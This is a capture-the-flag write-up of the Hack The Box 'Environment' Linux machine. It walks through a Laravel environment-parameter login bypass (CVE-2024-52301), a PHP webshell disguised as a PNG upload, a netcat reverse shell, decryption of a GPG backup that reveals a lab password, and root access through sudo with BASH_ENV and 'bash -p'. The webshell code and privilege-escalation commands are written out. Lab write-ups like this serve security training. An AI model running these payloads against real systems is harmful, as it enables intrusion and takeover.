<h1>ENVIRONMENT WRITE UP</h1>

<img width="699" height="388" alt="environment" src="https://github.com/user-attachments/assets/c7792ae0-af86-4ccc-ad74-add4d948e4c8" /><br>

<h2>MACHINE INFORMATION</h2>

<b>Difficulty:</b> Medium<br> <b>Operating System:</b> Linux<br> <b>IP Address:</b> 10.10.11.67<br> <b>Hostname:</b> environment.htb<br> <b>Open Ports:</b> 22/tcp, 80/tcp<br> <b>Web Server:</b> nginx 1.22.1<br> <b>Addition:</b> Laravel(11.30.0)<br>

<h2>SUMMARY</h2>

Environment is a medium difficulty Linux machine running a Laravel web application. The initial foothold starts with a login bypass caused by CVE-2024-52301, which allows environment manipulation through an "--env" parameter. After bypassing the login mechanism, I gain access to the management dashboard as the "Hish" user.

The management panel contains a profile picture upload functionality that is vulnerable to CVE-2024-2154. By uploading a PHP webshell disguised as an image, I obtain command execution on the target system and establish a reverse shell.

After gaining access to the system, I find an encrypted GPG backup containing valid user credentials. I decrypt the backup using the exposed GPG keys and use the recovered credentials to connect through SSH as the "hish" user.

For privilege escalation, I discover that the "hish" user can execute the "systeminfo" bash script with sudo privileges. The preserved "BASH_ENV" environment variable can be used to execute a custom Bash script with elevated privileges. By setting "BASH_ENV" to a script containing "bash -p", I obtain a root shell and get the root flag.

<h3>STEP BY STEP</h3>

<b>1-</b> First start with nmap scan

<code>nmap -sC -sV 10.10.11.67</code>

Result:

<img width="770" height="268" alt="ss1" src="https://github.com/user-attachments/assets/0a0df069-eb8c-4482-b63b-224510f6d283" /><br>

As I can see ports 22(SSH) and 80(HTTP) are open. The scan also gives me the host name "environment.htb".

<b>2-</b> Add "environment.htb" host name to my "/etc/hosts"

<code>echo "10.10.11.67	environment.htb" | sudo tee -a /etc/hosts</code>

From now on I can visit the website through "http://environment.htb".

<b>3-</b> I use Wappalyzer to identify the technologies running on the website.

The application is using Laravel.

<b>4-</b> There is not much to do at this point, so I start directory enumeration.

<code>gobuster dir -u http://environment.htb/ -w ~/Desktop/HTB/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt</code>

Result:

<img width="975" height="439" alt="ss2" src="https://github.com/user-attachments/assets/ac6a64bf-2cb1-4c1e-a928-d7d3022fd61c" /><br>

"/mailing", "/upload" and "/login" are looking interesting.

<b>5-</b> I visit "http://environment.htb/mailing" and "http://environment.htb/upload". Both pages give me the same output.

<img width="1366" height="688" alt="ss3" src="https://github.com/user-attachments/assets/65dc7829-7e58-4b74-a06d-68337f73ab1f" /><br>

As I can see, Laravel's Debug Mode is enabled. I can also identify the Laravel version as "11.30.0".

<b>6-</b> I start investigating the login mechanism. The login request sends "email", "password" and "remember" parameters to the server.

<img width="634" height="374" alt="ss4" src="https://github.com/user-attachments/assets/d7561960-300f-4ec4-b8e4-18006b3520a4" /><br>

Because Debug Mode is enabled, I can try to trigger an error and gather more information about how the application handles the request.

<b>7-</b> I intercept a login attempt and send an empty value for the "remember" parameter.

Result:

<img width="707" height="525" alt="ss5" src="https://github.com/user-attachments/assets/1cbebd89-dd95-409a-a4a8-a9c42b1d3c58" /><br>

The "environment" phrase inside the application's conditional statement catches my attention.

<b>8-</b> I start researching "Laravel 11.30.0 env bypass" and find information about <a href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a>. I continue looking for a PoC and find <a href="https://github.com/Nyamort/CVE-2024-52301">CVE-2024-52301 PoC</a>.

<b>9-</b> Based on the PoC and the error output from the login attempt, I modify my POST request.

<img width="596" height="156" alt="ss6" src="https://github.com/user-attachments/assets/06368fbd-84a2-4450-b334-d565796ad5c0" /><br>

When I send the request like this, the system redirects me to "/management/dashboard".

<img width="1004" height="450" alt="ss7" src="https://github.com/user-attachments/assets/b098ba30-2b90-40ad-9a79-e917bfdf5361" /><br>

From now on I am inside the system as the "Hish" user.

<img width="1366" height="688" alt="ss8" src="https://github.com/user-attachments/assets/1e6a35b2-be0c-4b6f-9d0e-9f06dbdda1cd" /><br>

<b>10-</b> There is a profile picture upload functionality in "/management/profile".

<img width="1366" height="687" alt="ss9" src="https://github.com/user-attachments/assets/1aa6b0cf-27b3-4546-9de8-505537fb090d" /><br>

<b>11-</b> I prepare a PHP webshell and name it "fnwn.png".

<code>GIF89a
<?php system($_REQUEST['cmd']);?></code>

After that I change the file mode:

<code>chmod +x fnwn.png</code>

<b>12-</b> I intercept the upload request and change the file name to "fnwn.php." before uploading it.

<img width="502" height="470" alt="ss10" src="https://github.com/user-attachments/assets/a6fdc0bf-aca0-439d-9ff0-a9fe80edda96" /><br>

Result:

<img width="1006" height="454" alt="ss11" src="https://github.com/user-attachments/assets/cb3cda7a-8615-469a-b480-3bd1492ad2fb" /><br>

The system accepts my file and gives me a path where I can access it.

<b>13-</b> I visit the uploaded file and pass "whoami" as the "cmd" parameter.

<code>http://environment.htb/storage/files/fnwn.php?cmd=whoami</code>

<img width="693" height="109" alt="ss12" src="https://github.com/user-attachments/assets/7cc319eb-fee6-4ae5-b479-355a617005d0" /><br>

And yes, command execution is working.

<b>14-</b> Now I need to connect to the system with a shell. For that, I start a Netcat listener on my machine:

<code>nc -lvnp 8282</code>

Then I use a reverse shell command as the "cmd" parameter value on the target system.

<img width="502" height="217" alt="ss13" src="https://github.com/user-attachments/assets/cb63fb9b-0409-4609-ad9c-4fe661beb6d7" /><br>

I got the shell.

<b>15-</b> I just need to find "user.txt".

<code>cd /home/hish</code>

Result:

<img width="499" height="177" alt="ss14" src="https://github.com/user-attachments/assets/9c1a0960-a23f-4a51-a809-83eea58c226e" /><br>

This is how I get the user flag.

<b>16-</b> I continue gathering information about the "hish" user's files. In "/home/hish/backup" I find a file named "keyvault.gpg".

<b>17-</b> I set up a separate GPG environment so that I can decrypt the file without modifying the target user's original GPG configuration or interfering with other sessions.

First, I copy the ".gnupg" directory to "/tmp" and name it "fnwn_gnupg":

<code>cp -r /home/hish/.gnupg /tmp/fnwn_gnupg</code>

Then I change the permissions:

<code>chmod -R 700 /tmp/fnwn_gnupg</code>

My temporary GPG environment is ready.

<b>18-</b> Now I start the GPG decryption process. First, I list the available secret keys using the temporary GPG home directory:

<code>gpg --homedir /tmp/fnwn_gnupg --list-secret-keys</code>

Then I decrypt "keyvault.gpg":

<code>gpg --homedir /tmp/fnwn_gnupg --output fnwn_output.txt --decrypt /home/hish/backup/keyvault.gpg</code>

Result:

<img width="818" height="210" alt="ss15" src="https://github.com/user-attachments/assets/8610650d-ebe0-4c33-90c8-234f7c087eb3" /><br>

I obtain a password from the decrypted file.

<b>19-</b> From now on I can connect to the target system via SSH as the "hish" user.

<code>username= hish
password= marineSPm@ster!!</code>

<code>ssh [hish@environment.htb](mailto:hish@environment.htb)</code>

Result:

<img width="757" height="229" alt="ss16" src="https://github.com/user-attachments/assets/44741388-5b4e-4c3a-9a6e-d9443edd1bef" /><br>

<b>20-</b> I check the "hish" user's sudo permissions.

<code>sudo -l</code>

Result:

<img width="1146" height="136" alt="ss17" src="https://github.com/user-attachments/assets/f5429258-0a29-4cd0-ac53-862f03dbd1b0" /><br>

As I can see, the "hish" user has sudo permission to execute the "systeminfo" Bash script.

<b>21-</b> I look at the Bash script code.

<code>cat /usr/bin/systeminfo</code>

Result:

<img width="590" height="324" alt="ss18" src="https://github.com/user-attachments/assets/ce513722-41ca-4f7d-9bc2-09d429002457" /><br>

It is just a Bash script used to gather information about the system.

<b>22-</b> The important part is that if I can run a custom script through a command executed with sudo privileges, I can use the preserved "BASH_ENV" environment variable to execute commands with elevated privileges.

First, I create a Bash script containing "bash -p":

<code>echo "bash -p" > fnwn.sh</code>

Then I make it executable:

<code>chmod +x fnwn.sh</code>

Finally, I execute "systeminfo" with "BASH_ENV" pointing to my custom script:

<code>sudo BASH_ENV=./fnwn.sh /usr/bin/systeminfo</code>

Result:

<img width="520" height="100" alt="ss19" src="https://github.com/user-attachments/assets/f2ca2040-6836-4cbe-ac0e-c42079cbe957" /><br>

"bash -p" starts Bash while preserving the effective privileges. Because the script is executed through sudo, the resulting shell runs with root privileges.

And it works.

<b>23-</b> From now on I just need to go to the directory where "root.txt" is located.

<code>ls /root</code>

Result:

<img width="310" height="48" alt="ss20" src="https://github.com/user-attachments/assets/ecdaf94e-c0ef-4307-b0f5-565e3ccfb5a2" /><br>

This is how I get the root flag.

<h2>RESOURCE</h2>
<ul>
<li><a href="https://www.cybersecurity-help.cz/vdb/SB20241112127">CVE-2024-52301</a></li>
<li><a href="https://github.com/Nyamort/CVE-2024-52301">CVE-2024-52301 POC</a></li>
</ul>
